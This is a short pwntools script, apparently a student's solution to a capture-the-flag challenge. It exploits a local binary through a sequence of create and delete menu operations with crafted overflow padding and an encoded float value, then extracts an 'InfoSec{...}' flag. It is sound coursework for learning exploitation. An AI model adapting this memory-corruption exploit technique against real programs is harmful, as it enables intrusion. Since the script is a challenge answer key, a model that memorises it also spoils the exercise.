#!/usr/bin/env python3
from pwn import *
import re

# Setup
context.log_level = 'error'

# Run process
io = process("./main.elf")

# -221.10549 -> b'\xc3\x5d\x1b\x01' -> b'\x01\x1b\x5d\xc3' (Lil endian)
negNum = b'\x01\x1b\x5d\xc3'

# Create yellow
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'a' * 28 + negNum)
# Delete yellow
io.sendline(b'3')
io.sendline(b'2')
# Create green
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'a' * 28)
# Delete green
io.sendline(b'3')
io.sendline(b'1')
# Create green
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'a' * 28)
# Delete red
io.sendline(b'3')
io.sendline(b'3')
# Create yellow
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'a' * 31 + b'\x00')
# Open door with green
io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'a' * 31 + b'\x00')

# Do the flag reading thingy with REEEEEEEEEEE (Regular Expression stolen from professor MartinSchwarzl, he also likes to help a lot and everybody likes when he holds his lectures, all credits go to him)
r = io.recvall().decode('ascii')
flag_regex = re.compile('(InfoSec{.+[^}]})')
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)